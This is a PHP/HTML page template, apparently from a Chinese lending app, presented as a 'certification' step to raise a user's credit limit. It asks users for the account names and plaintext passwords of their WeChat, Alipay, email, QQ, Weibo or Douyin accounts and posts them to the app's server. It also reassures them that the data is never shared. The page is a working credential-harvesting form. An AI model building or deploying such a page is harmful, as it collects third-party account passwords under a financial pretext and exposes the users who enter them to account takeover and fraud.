<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title></title>
        <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link rel="stylesheet" type="text/css" href="<?= base_url() ?>public/css/mui.min.css" />
        <link rel="stylesheet" type="text/css" href="<?= base_url() ?>public/css/page/limitRZ.css" />

    </head>

    <body>
        <div class="mui-scroll-wrapper mui-content bg-white">
            <div class="mui-scroll page-section-60">
                <section class="limit-hd">
                    <h2 class="text-size-25 font-black"></h2>
                </section>



                <section class="limit-bd margin-h-10  margin-top-37">
                    <form class="mui-input-group">
                        
                    </form>
                    <div class="mui-button-row">
                        <small class="text-size-12 font-purple">所有信息仅用于提升额度，绝不对外提供</small>
                        <button id="submit" class="mui-btn mui-btn-block mui-btn-disabled text-size-16 custom-radius">确认并提交</button>
                    </div>
                </section>
            </div>
        </div>  

        <script id="type_tpl" type="text/html">
            <div class="mui-input-row text-size-15">
                <label class="font-black">{{type|setName}}账户</label>
                <input id="account" type="text" placeholder="请输入{{type|setName}}账户">
            </div>
            <div class="mui-input-row text-size-15">
                <label class="font-black">{{type|setName}}密码</label>
                <input id="password" type="text" placeholder="请输入{{type|setName}}密码">
            </div>
        </script>

        <script>
            function setName(type) {
                var format = '';
                switch (type) {
                    case 'wx':
                        format = "微信";
                        break;
                    case 'zfb':
                        format = "支付宝";
                        break;
                    case 'email':
                        format = "邮箱";
                        break;
                    case 'qq':
                        format = "QQ号";
                        break;
                    case 'weibo':
                        format = "微博";
                        break;
                    case 'douyin':
                        format = "抖音";
                        break;
                }
                
                return format;               
            }
            function ajaxUrl(type) {
                var format = '';
                switch (type) {
                    case 'wx':
                        format = "addWX";
                        break;
                    case 'zfb':
                        format = "addZFB";
                        break;
                    case 'email':
                        format = "addEmail";
                        break;
                    case 'qq':
                        format = "addQQ";
                        break;
                    case 'weibo':
                        format = "addWeiBo";
                        break;
                    case 'douyin':
                        format = "addDouYin";
                        break;
                }
                
                return format;               
            }
        </script>
        <script src="<?= base_url() ?>public/js/app.js" type="text/javascript"></script>
        <script src="<?= base_url() ?>public/js/template.js" type="text/javascript"></script>
        <script src="<?= base_url() ?>public/js/rem.js" type="text/javascript"></script>
        <script src="<?= base_url() ?>public/js/jquery.min.js" type="text/javascript"></script>
        <script src="<?= base_url() ?>public/js/mui.min.js" type="text/javascript" charset="utf-8"></script>

        <script>
            var type = GetQueryString('type');
            $('form').html(template('type_tpl',{type:type}));

            var title = setName(type);
            document.title = title+'认证';
            $('.limit-hd h2').text(title+'认证');

            $(function () {

                mui.init();
                (function (mui, $) {

                    // 登录按钮的禁用状态
                    $('input').on('input propertychange', function () {
                        var account = $('#account').val(),
                            password = $('#password').val();
                        if (account !== "" && password !== "") {
                            $('button').removeClass('mui-btn-disabled').addClass('custom-btn-gradient');
                        } else {
                            $('button').addClass('mui-btn-disabled').removeClass('custom-btn-gradient');
                        }
                    });


                    // 提交认证
                    document.querySelector('#submit').addEventListener('tap', function () {
                        if ($(this).hasClass('mui-btn-disabled')) {
                            mui.toast('请完善信息');
                            return;
                        }

                        submitRZ();
                    });

                    // ========================================== 工具方法 =======================================

                    function submitRZ() {
                        var url = '../user/'+ ajaxUrl(type),                        
                            account = $('#account').val(),
                            password = $('#password').val();
                        var json = {
                            'account': account,
                            'password': password,
                        }
                        
                        $.post(url, json, function (res) {
                            if (res.s == 200) {
                                tools.route('../supvp/auditing');
                            }else{
                                mui.toast(res.d);
                            }
                        }, 'json');
                    }

                    var tools = {
                        route: function (url) {
                            mui.openWindow({
                                url: url
                            });
                        }
                    }
                })(mui, jQuery);
            })
        </script>
    </body>

</html>